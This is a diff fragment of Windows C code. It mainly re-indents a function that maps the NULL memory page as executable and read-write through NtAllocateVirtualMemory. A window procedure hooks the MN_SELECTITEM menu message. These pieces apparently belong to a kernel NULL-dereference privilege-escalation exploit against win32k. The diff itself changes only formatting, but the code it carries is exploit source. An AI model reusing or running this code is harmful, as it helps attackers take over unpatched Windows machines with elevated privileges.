@@ -20,43 +20,43 @@ NTSTATUS
 
 void AllocNullPage() 
 {
-HMODULE h;
-HANDLE hProc;
-PVOID addr;
-ULONG size;
-NTSTATUS st;
+   HMODULE h;
+   HANDLE hProc;
+   PVOID addr;
+   ULONG size;
+   NTSTATUS st;
 
-size = 4096;
-addr = (PVOID)1;
-h = LoadLibraryA("ntdll.dll");
+   size = 4096;
+   addr = (PVOID)1;
+   h = LoadLibraryA("ntdll.dll");
 
-if (!h)
-{
+  if (!h)
+  {
+  	exit(1);
+  }
+  NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
+
+  NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(h, "NtAllocateVirtualMemory");
+
+  if (!NtAllocateVirtualMemory) 
+  {
+ 	exit(1);
+  }
+
+  hProc = GetCurrentProcess();
+
+  if (!hProc)
+  {
+	exit(1);
+  }
+
+  st = NtAllocateVirtualMemory(hProc, &addr, 0, &size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+  if (!NT_SUCCESS(st))
+  {
+	exit(1);
+  }
 	
-	exit(1);
-}
-NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
-
-NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(h, "NtAllocateVirtualMemory");
-
-if (!NtAllocateVirtualMemory) 
-{
-	exit(1);
-}
-
-hProc = GetCurrentProcess();
-
-if (!hProc)
-{
-	exit(1);
-}
-
-st = NtAllocateVirtualMemory(hProc, &addr, 0, &size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-if (!NT_SUCCESS(st))
-{
-	exit(1);
-}
 }
 
 LRESULTCALLBACK MyWndProc (HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam) 
@@ -68,7 +68,6 @@ if (Msg == 0x1E5) // MN_SELECTITEM
 } 
 return DefWindowProc (hWnd, Msg, wParam, lParam); 
 }
-
     //===================================================================================
     //ShowPopupMenu
     //===================================================================================
